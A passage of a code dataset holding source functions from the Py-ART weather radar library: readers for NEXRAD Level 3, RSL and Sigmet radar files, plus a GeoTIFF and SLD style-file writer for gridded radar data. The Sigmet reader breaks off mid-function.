    """"""
    Read a NEXRAD Level 3 product.

    Parameters
    ----------
    filename : str
        Filename of NEXRAD Level 3 product file. The files hosted by
        at the NOAA National Climate Data Center [1]_ as well as on the
        NWS WSR-88D Level III Data Collection and Distribution Network
        have been tests. Other NEXRAD Level 3 files may or may not work.
        A file-like object pointing to the beginning of such a file is also
        supported [2]_.
    field_names : dict, optional
        Dictionary mapping NEXRAD level 3 product number to radar field names.
        If the product number of the file does not appear in this dictionary
        or has a value of None it will not be placed in the radar.fields
        dictionary. A value of None, the default, will use the mapping
        defined in the metadata configuration file.
    additional_metadata : dict of dicts, optional
        Dictionary of dictionaries to retrieve metadata from during this read.
        This metadata is not used during any successive file reads unless
        explicitly included. A value of None, the default, will not
        introduct any addition metadata and the file specific or default
        metadata as specified by the metadata configuration file will be used.
    file_field_names : bool, optional
        True to use the product number for the field name. In this case the
        field_names parameter is ignored. The field dictionary will likely
        only have a 'data' key, unless the fields are defined in
        `additional_metadata`.
    exclude_fields : list or None, optional
        List of fields to exclude from the radar object. This is applied
        after the `file_field_names` and `field_names` parameters. Set
        to None to include all fields specified by include_fields.
    include_fields : list or None, optional
        List of fields to include from the radar object. This is applied
        after the `file_field_names` and `field_names` parameters. Set
        to None to include all fields not specified by exclude_fields.
    **kwargs
        Additional keyword arguments to pass to fsspec to open the dataset

    Returns
    -------
    radar : Radar
        Radar object containing all moments and sweeps/cuts in the volume.
        Gates not collected are masked in the field data.

    References
    ----------
    .. [1] http://www.ncdc.noaa.gov/
    .. [2] http://www.roc.noaa.gov/wsr88d/Level_III/Level3Info.asp

    """"""
    _test_arguments(kwargs)
    filemetadata = FileMetadata('nexrad_level3', field_names, additional_metadata, file_field_names, exclude_fields, include_fields)
    nfile = NEXRADLevel3File(prepare_for_read(filename, storage_options=storage_options))
    nradials = nfile.packet_header['nradials']
    msg_code = nfile.msg_header['code']
    time = filemetadata('time')
    time_start = nfile.get_volume_start_datetime()
    time['units'] = make_time_unit_str(time_start)
    time['data'] = np.zeros((nradials,), dtype='float64')
    _range = filemetadata('range')
    _range['data'] = nfile.get_range()
    _range['meters_to_center_of_first_gate'] = _range['data'][0]
    _range['meters_between_gates'] = _range['data'][1] - _range['data'][0]
    fields = {}
    field_name = filemetadata.get_field_name(msg_code)
    if field_name is None:
        fields = {}
    else:
        dic = filemetadata(field_name)
        dic['_FillValue'] = get_fillvalue()
        dic['data'] = nfile.get_data()
        fields = {field_name: dic}
    metadata = filemetadata('metadata')
    metadata['original_container'] = 'NEXRAD Level 3'
    scan_type = 'ppi'
    latitude = filemetadata('latitude')
    longitude = filemetadata('longitude')
    altitude = filemetadata('altitude')
    (lat, lon, height) = nfile.get_location()
    if altitude['units'] == 'meters':
        height = height * 0.3048
    latitude['data'] = np.array([lat], dtype='float64')
    longitude['data'] = np.array([lon], dtype='float64')
    altitude['data'] = np.array([height], dtype='float64')
    sweep_number = filemetadata('sweep_number')
    sweep_mode = filemetadata('sweep_mode')
    sweep_start_ray_index = filemetadata('sweep_start_ray_index')
    sweep_end_ray_index = filemetadata('sweep_end_ray_index')
    sweep_number['data'] = np.array([0], dtype='int32')
    sweep_mode['data'] = np.array(1 * ['azimuth_surveillance'], dtype='S')
    sweep_start_ray_index['data'] = np.array([0], dtype='int32')
    sweep_end_ray_index['data'] = np.array([nradials - 1], dtype='int32')
    azimuth = filemetadata('azimuth')
    elevation = filemetadata('elevation')
    fixed_angle = filemetadata('fixed_angle')
    azimuth['data'] = nfile.get_azimuth()
    elev = nfile.get_elevation()
    elevation['data'] = np.ones((nradials,), dtype='float32') * elev
    fixed_angle['data'] = np.array([elev], dtype='float32')
    nfile.close()
    return Radar(time, _range, fields, metadata, scan_type, latitude, longitude, altitude, sweep_number, sweep_mode, fixed_angle, sweep_start_ray_index, sweep_end_ray_index, azimuth, elevation, instrument_parameters=None)"
ARM-DOE/pyart,write_grid_geotiff,"def write_grid_geotiff(grid, filename, field, rgb=False, level=None, cmap='viridis', vmin=0, vmax=75, color_levels=None, warp=False, sld=False, use_doublequotes=True):
    """"""
    Write a Py-ART Grid object to a GeoTIFF file.

    The GeoTIFF can be the standard Azimuthal Equidistant projection used
    in Py-ART, or a lat/lon projection on a WGS84 sphere. The latter is
    typically more usable in web mapping applications. The GeoTIFF can
    contain a single float-point raster band, or three RGB byte raster bands.
    The former will require an SLD file for colorful display using standard
    GIS or web mapping software, while the latter will show colors
    ""out-of-the-box"" but lack actual data values. The function also can
    output an SLD file based on the user-specified inputs. User can specify
    the 2D vertical level to be output. If this is not specified, a 2D
    composite is created. User also can specify the field to output.

    This function requires GDAL Python libraries to be installed. These are
    available via conda; e.g., 'conda install gdal'

    Parameters
    ----------
    grid : pyart.core.Grid object
        Grid object to write to file.
    filename : str
        Filename for the GeoTIFF.
    field : str
        Field name to output to file.

    Other Parameters
    ----------------
    rbg : bool, optional
        True - Output 3-band RGB GeoTIFF

        False - Output single-channel, float-valued GeoTIFF. For display,
                likely will need an SLD file to provide a color table.

    level : int or None, optional
        Index for z-axis plane to output. None gives composite values
        (i.e., max in each vertical column).
    cmap : str or matplotlib.colors.Colormap object, optional
        Colormap to use for RGB output or SLD file.
    vmin : int or float, optional
        Minimum value to color for RGB output or SLD file.
    vmax : int or float, optional
        Maximum value to color for RGB output or SLD file.
    color_levels : int or None, optional
        Number of color levels in cmap. Useful for categorical colormaps
        with steps << 255 (e.g., hydrometeor ID).
    warp : bool, optional
        True - Use gdalwarp (called from command line using os.system)
               to warp to a lat/lon WGS84 grid.

        False - No warping will be performed. Output will be Az. Equidistant.

    sld : bool, optional
        True - Create a Style Layer Descriptor file (SLD) mapped to vmin/vmax
               and cmap. File is named same as output TIFF, except for .sld
               extension.

        False - Don't do this.

    use_doublequotes : bool, optional
        True - Use double quotes in the gdalwarp call (requires warp=True),
               which may help if that command is producing and error like:
               'Translating source or target SRS failed'.

        False - Use single quotes instead.

    """"""
    if not IMPORT_FLAG:
        raise MissingOptionalDependency('GDAL not detected, GeoTIFF output failure!')
    if field not in grid.fields.keys():
        raise KeyError('Failed -', field, 'field not found in Grid object.')
    if '.' not in filename:
        name = filename
        end = 'tif'
        ofile = name + '.' + end
    else:
        ofile = filename
    (nz, ny, nx) = grid.fields[field]['data'].shape
    dist = max(grid.x['data'])
    rangestep = grid.x['data'][1] - grid.x['data'][2]
    lat = grid.origin_latitude['data'][0]
    lon = grid.origin_longitude['data'][0]
    filled = np.ma.filled(grid.fields[field]['data'], fill_value=-32768)
    if level is None:
        data = np.amax(filled, 0)
    else:
        data = filled[level]
    data = data.astype(float)
    data[data == -32768] = np.nan
    iproj = 'PROJCS[""unnamed"",GEOGCS[""WGS 84"",DATUM[""unknown"",' + 'SPHEROID[""WGS84"",6378137,298.257223563]],' + 'PRIMEM[""Greenwich"",0],' + 'UNIT[""degree"",0.0174532925199433]],' + 'PROJECTION[""Azimuthal_Equidistant""],' + 'PARAMETER[""latitude_of_center"",' + str(lat) + '],' + 'PARAMETER[""longitude_of_center"",' + str(lon) + '],' + 'PARAMETER[""false_easting"",0],' + 'PARAMETER[""false_northing"",0],' + 'UNIT[""metre"",1,AUTHORITY[""EPSG"",""9001""]]]'
    out_driver = gdal.GetDriverByName('GTiff')
    if not rgb:
        dst_options = ['COMPRESS=LZW', 'ALPHA=YES']
        dst_ds = out_driver.Create(ofile, data.shape[1], data.shape[0], 1, gdal.GDT_Float32, dst_options)
    else:
        (rarr, garr, barr) = _get_rgb_values(data, vmin, vmax, color_levels, cmap)
        dst_ds = out_driver.Create(ofile, data.shape[1], data.shape[0], 3, gdal.GDT_Byte)
    dst_ds.SetGeoTransform([-dist, -rangestep, 0, dist, 0, rangestep])
    dst_ds.SetProjection(iproj)
    if not rgb:
        dst_ds.GetRasterBand(1).WriteArray(data[::-1, :])
    else:
        dst_ds.GetRasterBand(1).WriteArray(rarr[::-1, :])
        dst_ds.GetRasterBand(2).WriteArray(garr[::-1, :])
        dst_ds.GetRasterBand(3).WriteArray(barr[::-1, :])
    dst_ds.FlushCache()
    dst_ds = None
    if sld:
        _create_sld(cmap, vmin, vmax, ofile, color_levels)
    if warp:
        if use_doublequotes:
            os.system('gdalwarp -q -t_srs ""+proj=longlat +ellps=WGS84 ' + '+datum=WGS84 +no_defs"" ' + ofile + ' ' + ofile + '_tmp.tif')
        else:
            os.system(""gdalwarp -q -t_srs '+proj=longlat +ellps=WGS84 "" + ""+datum=WGS84 +no_defs' "" + ofile + ' ' + ofile + '_tmp.tif')
        shutil.move(ofile + '_tmp.tif', ofile)"
ARM-DOE/pyart,_get_rgb_values,"def _get_rgb_values(data, vmin, vmax, color_levels, cmap):
    """"""
    Get RGB values for later output to GeoTIFF, given a 2D data field,
    display min/max and color table info. Missing data get numpy.nan.
    Only called if rgb is True in write_grid_geotiff.

    Parameters
    ----------
    data : numpy.ndarray object, dtype int or float
        Two-dimensional data array.
    vmin : int or float
        Minimum value to color for RGB output or SLD file.
    vmax : int or float
        Maximum value to color for RGB output or SLD file.
    color_levels : int
        Number of color levels in cmap. Useful for categorical colormaps
        with steps << 255 (e.g., hydrometeor ID).
    cmap : str or matplotlib.colors.Colormap object, optional
        Colormap to use for RGB output or SLD file.

    Returns
    -------
    rarr : numpy.ndarray object, dtype int
        Red channel indices (range = 0-255).
    barr : numpy.ndarray object, dtype int
        Blue channel indices (range = 0-255).
    garr : numpy.ndarray object, dtype int
        Green channel indices (range = 0-255).

    """"""
    frac = (data - vmin) / float(vmax - vmin)
    if color_levels is None:
        color_levels = 255
    index = (frac * color_levels).ravel()
    index[index < 0] = 0
    index[index > 255] = 255
    rarr = []
    garr = []
    barr = []
    cmap = plt.cm.get_cmap(cmap)
    for val in index:
        if not np.isnan(val):
            ind = int(np.round(val))
            (r, g, b, t) = cmap(ind)
            rarr.append(int(np.round(r * 255)))
            garr.append(int(np.round(g * 255)))
            barr.append(int(np.round(b * 255)))
        else:
            rarr.append(np.nan)
            garr.append(np.nan)
            barr.append(np.nan)
    rarr = np.reshape(rarr, data.shape)
    garr = np.reshape(garr, data.shape)
    barr = np.reshape(barr, data.shape)
    return (rarr, garr, barr)"
ARM-DOE/pyart,_create_sld,"def _create_sld(cmap, vmin, vmax, filename, color_levels=None):
    """"""
    Develop a Style Layer Descriptor file given a color table and
    user-specified min/max files. Output color info to that file.
    Only called if sld is True in write_grid_geotiff.

    Parameters
    ----------
    cmap : str or matplotlib.colors.Colormap object, optional
        Colormap to use for RGB output or SLD file.
    vmin : int or float
        Minimum value to color for RGB output or SLD file.
    vmax : int or float
        Maximum value to color for RGB output or SLD file.
    filename : str
        Template for SLD filename. The suffix (presumably .tif or .tiff)
        is removed and replaced with .sld. Thus, if provided a filename
        radar_reflectivity.tif, the output SLD file will be called
        radar_reflectivity.sld.

    Other Parameters
    ----------------
    color_levels : int or None, optional
        Number of color levels in cmap. Useful for categorical colormaps
        with steps << 255 (e.g., hydrometeor ID).

    """"""
    cmap = plt.cm.get_cmap(cmap)
    if color_levels is None:
        color_levels = 255
    (name, _) = filename.split('.')
    ofile = name + '.sld'
    fileobj = open(ofile, 'w')
    header = '<?xml version=""1.0"" encoding=""UTF-8""?>\n<sld:StyledLayerDescriptor xmlns=""http://www.opengis.net/sld"" xmlns:sld=""http://www.opengis.net/sld"" xmlns:ogc=""http://www.opengis.net/ogc"" xmlns:gml=""http://www.opengis.net/gml"" version=""1.0.0"">\n    <sld:UserLayer>\n        <sld:LayerFeatureConstraints>\n            <sld:FeatureTypeConstraint/>\n        </sld:LayerFeatureConstraints>\n        <sld:UserStyle>\n            <sld:Name>' + str(name) + '</sld:Name>\n            <sld:FeatureTypeStyle>\n                <sld:Name>name</sld:Name>\n                <sld:FeatureTypeName>Feature</sld:FeatureTypeName>\n                <sld:Rule>\n                    <sld:RasterSymbolizer>\n                        <sld:ColorMap>'
    fileobj.write(header)
    for i in np.arange(color_levels + 1):
        val = i * (vmax - vmin) / color_levels + vmin
        rgbt = cmap(i)
        if i == 0:
            op = 0.0
        else:
            op = 1.0
        hexval = colors.rgb2hex(rgbt[0:3])
        wstr = '\n                            <sld:ColorMapEntry color=""' + str(hexval).upper() + '"" opacity=""' + str(op) + '"" quantity=""' + str(val) + '""/>'
        fileobj.write(wstr)
    footer = '\n                        </sld:ColorMap>\n                    </sld:RasterSymbolizer>\n                </sld:Rule>\n            </sld:FeatureTypeStyle>\n        </sld:UserStyle>\n    </sld:UserLayer>\n</sld:StyledLayerDescriptor>\n'
    fileobj.write(footer)
    fileobj.close()"
ARM-DOE/pyart,read_rsl,"def read_rsl(filename, field_names=None, additional_metadata=None, file_field_names=False, exclude_fields=None, delay_field_loading=False, include_fields=None, radar_format=None, callid=None, skip_range_check=False):
    """"""
    Read a file supported by RSL.

    Parameters
    ----------
    filename : str or RSL_radar
        Name of file whose format is supported by RSL.
    field_names : dict, optional
        Dictionary mapping RSL data type names to radar field names. If a
        data type found in the file does not appear in this dictionary or has
        a value of None it will not be placed in the radar.fields dictionary.
        A value of None, the default, will use the mapping defined in the
        Py-ART configuration file.
    additional_metadata : dict of dicts, optional
        Dictionary of dictionaries to retrieve metadata from during this read.
        This metadata is not used during any successive file reads unless
        explicitly included. A value of None, the default, will not
        introduct any addition metadata and the file specific or default
        metadata as specified by the Py-ART configuration file will be used.
    file_field_names : bool, optional
        True to use the RSL data type names for the field names. If this
        case the field_names parameter is ignored. The field dictionary will
        likely only have a 'data' key, unless the fields are defined in
        `additional_metadata`.
    exclude_fields : list or None, optional
        List of fields to exclude from the radar object. This is applied
        after the `file_field_names` and `field_names` parameters. Set
        to None to include all fields specified by include_fields.
    include_fields : list or None, optional
        List of fields to include from the radar object. This is applied
        after the `file_field_names` and `field_names` parameters. Set
        to None to include all fields not specified by exclude_fields.
    delay_field_loading : bool
        True to delay loading of field data from the file until the 'data'
        key in a particular field dictionary is accessed. In this case
        the field attribute of the returned Radar object will contain
        LazyLoadDict objects not dict objects.
    radar_format : str or None
        Format of the radar file. Must be 'wsr88d' or None.
    callid : str or None
        Four letter NEXRAD radar Call ID, only used when radar_format is
        'wsr88d'.
    skip_range_check : bool, optional
        True to skip check for uniform range bin location, the reported range
        locations will only be verified true for the first ray. False will
        perform the check and raise a IOError when the locations of the gates
        change between rays.

    Returns
    -------
    radar : Radar
        Radar object.

    """"""
    if not _RSL_AVAILABLE:
        raise MissingOptionalDependency('Py-ART must be build with support for TRMM RSL to use the read_rsl function.')
    filemetadata = FileMetadata('rsl', field_names, additional_metadata, file_field_names, exclude_fields, include_fields)
    fillvalue = get_fillvalue()
    rslfile = _rsl_interface.RslFile(filename.encode('ascii'), radar_format, callid)
    available_vols = rslfile.available_moments()
    first_volume = rslfile.get_volume(available_vols[0])
    first_sweep = first_volume.get_sweep(0)
    first_ray = first_sweep.get_ray(0)
    nsweeps = first_volume.nsweeps
    fixed_angle = filemetadata('fixed_angle')
    fdata = first_volume.get_sweep_fix_angles()
    fdata[fdata < 0.0] = 360.0 + fdata[fdata < 0.0]
    fixed_angle['data'] = fdata
    sweep_mode = filemetadata('sweep_mode')
    if rslfile.scan_mode == 0:
        scan_type = 'ppi'
        sweep_mode['data'] = np.array(nsweeps * ['azimuth_surveillance'], dtype='S')
    else:
        scan_type = 'rhi'
        sweep_mode['data'] = np.array(nsweeps * ['rhi'], dtype='S')
    time = filemetadata('time')
    t_start = datetime.datetime(rslfile.year, rslfile.month, rslfile.day, rslfile.hour, rslfile.minute, int(rslfile.sec), int(1000000.0 * (rslfile.sec % 1)))
    datetimes = []
    for i in range(nsweeps):
        sweep = first_volume.get_sweep(i)
        for j in range(sweep.nrays):
            datetimes.append(sweep.get_ray(j).get_datetime())
    t_delta = [t - t_start for t in datetimes]
    sec_since_start = [t.seconds + t.days * 3600 * 24 + t.microseconds / 1000000.0 for t in t_delta]
    time['data'] = np.array(sec_since_start, dtype=np.float64)
    time['units'] = make_time_unit_str(t_start)
    if not skip_range_check and (not first_volume.is_range_bins_uniform()):
        message = 'Range bin locations change between rays. File cannot be read with with correct range locations for all rays. To read in data reporting the ranges from the first ray set the **skip_range_check** parameter to True.'
        raise OSError(message)
    _range = filemetadata('range')
    gate0 = first_ray.range_bin1
    gate_size = first_ray.gate_size
    ngates = first_ray.nbins
    _range['data'] = gate0 + gate_size * np.arange(ngates, dtype='float32')
    _range['meters_to_center_of_first_gate'] = _range['data'][0]
    _range['meters_between_gates'] = np.array(gate_size, dtype='float32')
    fields = {}
    for volume_num in available_vols:
        if volume_num not in VOLUMENUM2RSLNAME:
            warnings.warn('Unknown Volume Number %d' % volume_num)
            continue
        rsl_field_name = VOLUMENUM2RSLNAME[volume_num]
        field_name = filemetadata.get_field_name(rsl_field_name)
        if field_name is None:
            continue
        field_dic = filemetadata(field_name)
        field_dic['_FillValue'] = fillvalue
        data_extractor = _RslVolumeDataExtractor(rslfile, volume_num, fillvalue)
        if delay_field_loading:
            field_dic = LazyLoadDict(field_dic)
            field_dic.set_lazy('data', data_extractor)
        else:
            field_dic['data'] = data_extractor()
        fields[field_name] = field_dic
    metadata = filemetadata('metadata')
    metadata['original_container'] = 'rsl'
    rsl_dict = rslfile.get_radar_header()
    need_from_rsl_header = {'name': 'instrument_name', 'project': 'project', 'state': 'state', 'country': 'country'}
    for (rsl_key, metadata_key) in need_from_rsl_header.items():
        metadata[metadata_key] = rsl_dict[rsl_key]
    latitude = filemetadata('latitude')
    lat = _dms_to_d((rsl_dict['latd'], rsl_dict['latm'], rsl_dict['lats']))
    latitude['data'] = np.array([lat], dtype='float64')
    longitude = filemetadata('longitude')
    lon = _dms_to_d((rsl_dict['lond'], rsl_dict['lonm'], rsl_dict['lons']))
    longitude['data'] = np.array([lon], dtype='float64')
    altitude = filemetadata('altitude')
    altitude['data'] = np.array([rsl_dict['height']], dtype='float64')
    sweep_number = filemetadata('sweep_number')
    sweep_start_ray_index = filemetadata('sweep_start_ray_index')
    sweep_end_ray_index = filemetadata('sweep_end_ray_index')
    sweep_number['data'] = np.arange(nsweeps, dtype='int32')
    ray_count = first_volume.get_nray_array()
    ssri = np.cumsum(np.append([0], ray_count[:-1])).astype('int32')
    sweep_start_ray_index['data'] = ssri
    sweep_end_ray_index['data'] = np.cumsum(ray_count).astype('int32') - 1
    azimuth = filemetadata('azimuth')
    elevation = filemetadata('elevation')
    (_azimuth, _elevation) = first_volume.get_azimuth_and_elev_array()
    azimuth['data'] = _azimuth
    elevation['data'] = _elevation
    prt = filemetadata('prt')
    prt_mode = filemetadata('prt_mode')
    nyquist_velocity = filemetadata('nyquist_velocity')
    unambiguous_range = filemetadata('unambiguous_range')
    beam_width_h = filemetadata('radar_beam_width_h')
    beam_width_v = filemetadata('radar_beam_width_v')
    (pm_data, nv_data, pr_data, ur_data) = first_volume.get_instr_params()
    prt['data'] = pr_data
    prt_mode['data'] = pm_data.astype('S')
    nyquist_velocity['data'] = nv_data
    unambiguous_range['data'] = ur_data
    beam_width_h['data'] = np.array([first_sweep.horz_half_bw * 2.0], dtype='float32')
    beam_width_v['data'] = np.array([first_sweep.vert_half_bw * 2.0], dtype='float32')
    instrument_parameters = {'unambiguous_range': unambiguous_range, 'prt_mode': prt_mode, 'prt': prt, 'nyquist_velocity': nyquist_velocity, 'radar_beam_width_h': beam_width_h, 'radar_beam_width_v': beam_width_v}
    return Radar(time, _range, fields, metadata, scan_type, latitude, longitude, altitude, sweep_number, sweep_mode, fixed_angle, sweep_start_ray_index, sweep_end_ray_index, azimuth, elevation, instrument_parameters=instrument_parameters)"
ARM-DOE/pyart,_dms_to_d,"def _dms_to_d(dms):
    """"""Degrees, minutes, seconds to degrees""""""
    return dms[0] + (dms[1] + dms[2] / 60.0) / 60.0"
ARM-DOE/pyart,__init__,"def __init__(self, rslfile, volume_num, fillvalue):
    """"""initialize the object.""""""
    self.rslfile = rslfile
    self.volume_num = volume_num
    self.fillvalue = fillvalue"
ARM-DOE/pyart,__call__,"def __call__(self):
    """"""Return an array containing data from the referenced volume.""""""
    data = self.rslfile.get_volume_array(self.volume_num)
    data[np.where(np.isnan(data))] = self.fillvalue
    data[np.where(data == 131072)] = self.fillvalue
    return np.ma.masked_equal(data, self.fillvalue)"
ARM-DOE/pyart,read_sigmet,"def read_sigmet(filename, field_names=None, additional_metadata=None, file_field_names=False, exclude_fields=None, include_fields=None, time_ordered='none', full_xhdr=None, noaa_hh_hdr=None, debug=False, ignore_xhdr=False, ignore_sweep_start_ms=None, **kwargs):
    """"""
    Read a Sigmet (IRIS) product file.

    Parameters
    ----------
    filename : str
        Name of Sigmet (IRIS) product file to read or file-like object
        pointing to the beginning of such a file.
    field_names : dict, optional
        Dictionary mapping Sigmet data type names to radar field names. If a
        data type found in the file does not appear in this dictionary or has
        a value of None it will not be placed in the radar.fields dictionary.
        A value of None, the default, will use the mapping defined in the
        metadata configuration file.
    additional_metadata : dict of dicts, optional
        Dictionary of dictionaries to retrieve metadata from during this read.
        This metadata is not used during any successive file reads unless
        explicitly included. A value of None, the default, will not
        introduct any addition metadata and the file specific or default
        metadata as specified by the metadata configuration file will be used.
    file_field_names : bool, optional
        True to use the Sigmet data type names for the field names. If this
        case the field_names parameter is ignored. The field dictionary will
        likely only have a 'data' key, unless the fields are defined in
        `additional_metadata`.
    exclude_fields : list or None, optional
        List of fields to exclude from the radar object. This is applied
        after the `file_field_names` and `field_names` parameters. Set
        to None to include all fields specified by include_fields.
    include_fields : list or None, optional
        List of fields to include from the radar object. This is applied
        after the `file_field_names` and `field_names` parameters. Set
        to None to include all fields not specified by exclude_fields.
    time_ordered : 'none', 'sequential', 'full', ...,  optional
        Parameter controlling if and how the rays are re-ordered by time.
        The default, 'none' keeps the rays ordered in the same manner as
        they appears in the Sigmet file. 'sequential' will determind and
        apply an operation which maintains a sequential ray order in elevation
        or azimuth yet orders the rays according to time. If no operation can
        be found to accomplish this a warning is issue and the rays are
        returned in their original order. 'roll', 'reverse', and
        'reverse_and_roll' will apply that operation to the rays in order to
        place them in time order, direct use of these is not recommended.
        'full' will order the rays in strictly time increasing order,
        but the rays will likely become non-sequential, thisoption is not
        recommended unless strict time increasing order is required.
    full_xhdr : bool or None
        Flag to read in all extended headers for possible decoding. None will
        determine if extended headers should be read in automatically by
        examining the extended header type.
    noaa_hh_hdr : bool or None
        Flag indicating if the extended header should be decoded as those
        used by the NOAA Hurricane Hunters aircraft radars. None will
        determine if the extended header is of this type automatically by
        examining the header. The `full_xhdr` parameter is set to True
        when this parameter is True.
    ignore_xhdr : bool, optional
        True to ignore all data in the extended headers if they exist.
        False, the default, extracts milliseconds precision times and other
        parameter from the extended headers if they exists in the file.
    ignore_sweep_start_ms : bool or None, optional
        True to ignore the millisecond parameter in the start time for each
        sweep, False will uses this parameter when determining the timing of
        each ray. None, the default, will ignore the millisecond sweep start
        timing only when the file does not contain extended headers or when
        the extended header has been explicity ignored using the `ignore_xhdr`
        parameter. The TRMM RSL library ignores these times so setting this
        parameter to True is required to match the times determined when
        reading Sigmet files with :py:func:`pyart.io.read_rsl`.
        When there are not extended headers ignoring the millisecond sweep
        times provides time data which is always prior to the actual
        collection time with an error from 0 to 2 seconds.
    debug : bool, optional
        Print debug information during read.

    Returns
    -------
    radar : Radar
        Radar object.

    """"""
    _test_arguments(kwargs)
    filemetadata = FileMetadata('sigmet', field_names, additional_metadata, file_field_names, exclude_fields, include_fields)
    sigmetfile = SigmetFile(prepare_for_read(filename), debug=debug)
    ingest_config = sigmetfile.ingest_header['ingest_configuration']
    task_config = sigmetfile.ingest_header['task_configuration']
    if noaa_hh_hdr:
        full_xhdr = True
    if full_xhdr is None:
        type_mask = task_config['task_dsp_info']['current_data_type_mask']
        if type_mask['extended_header_type'] == 2:
            full_xhdr = True
        else:
            full_xhdr = False
    (sigmet_data, sigmet_metadata) = sigmetfile.read_data(full_xhdr=full_xhdr)
    first_data_type = sigmetfile.data_type_names[0]
    if first_data_type == 'XHDR':
        first_data_type = sigmetfile.data_type_names[1]
    sigmetfile.close()
    (nsweeps, nrays, nbins) = sigmet_data[first_data_type].shape
    if nsweeps == 0:
        raise OSError('File contains no readable sweep data.')
    if ignore_xhdr:
        if 'XHDR' in sigmet_data:
            sigmet_data.pop('XHDR')
            sigmet_metadata.pop('XHDR')
    if full_xhdr and 'XHDR' in sigmet_data:
        xhdr = sigmet_data.pop('XHDR')
        sigmet_data['XHDR'] = xhdr[:, :, :2].copy().view('i4')
        sigmet_data['XHDR_FULL'] = xhdr
        xhdr_metadata = {}
        for key in sigmet_metadata['XHDR'].keys():
            xhdr_metadata[key] = sigmet_metadata['XHDR'][key].copy()
        sigmet_metadata['XHDR_FULL'] = xhdr_metadata
    good_rays = sigmet_metadata[first_data_type]['nbins'] != -1
    rays_missing = (sigmet_metadata[first_data_type]['nbins'] == -1).sum()
    for field_name in sigmet_data.keys():
        sigmet_data[field_name] = sigmet_data[field_name][good_rays]
        field_metadata = sigmet_metadata[field_name]
        for key in field_metadata.keys():
            field_metadata[key] = field_metadata[key][good_rays]
    rays_per_sweep = good_rays.sum(axis=1)
    if time_ordered == 'sequential':
        if task_config['task_scan_info']['antenna_scan_mode'] == 2:
            if _is_time_ordered_by_reversal(sigmet_data, sigmet_metadata, rays_per_sweep):
                time_ordered = 'reverse'
            else:
                warnings.warn('Rays not collected sequentially in time.')
                time_ordered = 'none'
        elif _is_time_ordered_by_roll(sigmet_data, sigmet_metadata, rays_per_sweep):
            time_ordered = 'roll'
        elif _is_time_ordered_by_reverse_roll(sigmet_data, sigmet_metadata, rays_per_sweep):
            time_ordered = 'reverse_and_roll'
        else:
            warnings.warn('Rays not collected sequentially in time.')
            time_ordered = 'none'
    if time_ordered == 'full':
        _time_order_data_and_metadata_full(sigmet_data, sigmet_metadata, rays_per_sweep)
    if time_ordered == 'reverse':
        _time_order_data_and_metadata_reverse(sigmet_data, sigmet_metadata, rays_per_sweep)
    if time_ordered == 'roll':
        _time_order_data_and_metadata_roll(sigmet_data, sigmet_metadata, rays_per_sweep)
    if time_ordered == 'reverse_and_roll':
        _time_order_data_and_metadata_reverse(sigmet_data, sigmet_metadata, rays_per_sweep)
        _time_order_data_and_metadata_roll(sigmet_data, sigmet_metadata, rays_per_sweep)
    ray_count = good_rays.sum(axis=1)
    total_rays = ray_count.sum()
    sweep_start_ray_index = filemetadata('sweep_start_ray_index')
    sweep_end_ray_index = filemetadata('sweep_end_ray_index')
    ssri = np.cumsum(np.append([0], ray_count[:-1])).astype('int32')
    sweep_start_ray_index['data'] = ssri
    sweep_end_ray_index['data'] = np.cumsum(ray_count).astype('int32') - 1
    if 'XHDR' in sigmet_data:
        tdata = sigmet_data.pop('XHDR')
        tdata = (tdata.flatten() / 1000.0).astype('float64')
        sigmet_extended_header = True
    else:
        tdata = sigmet_metadata[first_data_type]['time'].astype('float64')
        sigmet_extended_header = False
    dts = [ymds_time_to_datetime(d['sweep_start_time']) for d in sigmetfile.ingest_data_headers[first_data_type]]
    if ignore_sweep_start_ms is None:
        ignore_sweep_start_ms = not sigmet_extended_header
    if ignore_sweep_start_ms:
        dts = [d.replace(microsecond=0) for d in dts]
    dt_start = dts[0].replace(microsecond=0)
    for (i, dt) in enumerate(dts):
        start = sweep_start_ray_index['data'][i]
        end = sweep_end_ray_index['data'][i]
        td = dt - dt_start
        tdata[start:end + 1] += (td.microseconds + (td.seconds + td.days * 24 * 3600) * 10 ** 6) / 10 ** 6
    time = filemetadata('time')
    time['data'] = tdata
    time['units'] = make_time_unit_str(dt_start)
    _range = filemetadata('range')
    range_info = task_config['task_range_info']
    gate_0 = range_info['first_bin_range'] / 100.0
    gate_nbin = range_info['last_bin_range'] / 100.0
    gate_size = round((gate_nbin - gate_0) / nbins)
    _range['data'] = gate_0 + gate_size * np.arange(nbins, dtype='float32')
    _range['meters_to_center_of_first_gate'] = np.array([gate_0], dtype='float32')
    _range['meters_between_gates'] = np.array([gate_size], dtype='float32')
    fields = {}
    for (data_type_name, fdata) in sigmet_data.items():
        if data_type_name == 'XHDR_FULL':
            continue
        field_name = filemetadata.get_field_name(data_type_name)
        if field_name is None:
            continue
        field_dic = filemetadata(field_name)
        field_dic['data'] = fdata.reshape(-1, nbins)
        field_dic['_FillValue'] = get_fillvalue()
        fields[field_name] = field_dic
    metadata = filemetadata('metadata')
    metadata['original_container'] = 'sigmet'
    metadata['instrument_name'] = ingest_config['site_name'].strip()
    metadata['sigmet_task_name'] = sigmetfile.product_hdr['product_configuration']['task_name']
    if sigmet_extended_header:
        metadata['sigmet_extended_header'] = 'true'
    else:
        metadata['sigmet_extended_header'] = 'false'
    metadata['time_ordered'] = time_ordered
    metadata['rays_missing'] = rays_missing
    if task_config['task_scan_info']['antenna_scan_mode'] == 2:
        scan_type = 'rhi'
    else:
        scan_type = 'ppi'
    latitude = filemetadata('latitude')
    lat = bin4_to_angle(ingest_config['latitude_radar'])
    if lat > 180.0:
        lat -= 360.0
    latitude['data'] = np.array([lat], dtype='float64')
    longitude = filemetadata('longitude')
    lon = bin4_to_angle(ingest_config['longitude_radar'])
    if lon > 180.0:
        lon -= 360.0
    longitude['data'] = np.array([lon], dtype='float64')
    altitude = filemetadata('altitude')
    alt = sigmetfile.product_hdr['product_end']['ground_height']
    altitude['data'] = np.array([alt], dtype='float64')
    sweep_number = filemetadata('sweep_number')
    sweep_number['data'] = np.arange(nsweeps, dtype='int32')
    fixed_angle = filemetadata('fixed_angle')
    fa = [d['fixed_angle'] for d in sigmetfile.ingest_data_headers[first_data_type]]
    fixed_angle['data'] = bin2_to_angle(np.array(fa)).astype('float32')
    azimuth = filemetadata('azimuth')
    az0 = sigmet_metadata[first_data_type]['azimuth_0']
    az1 = sigmet_metadata[first_data_type]['azimuth_1']
    az_data = mean_of_two_angles_deg(az0, az1).astype('float32')
    az_data[az_data < 0] += 360.0
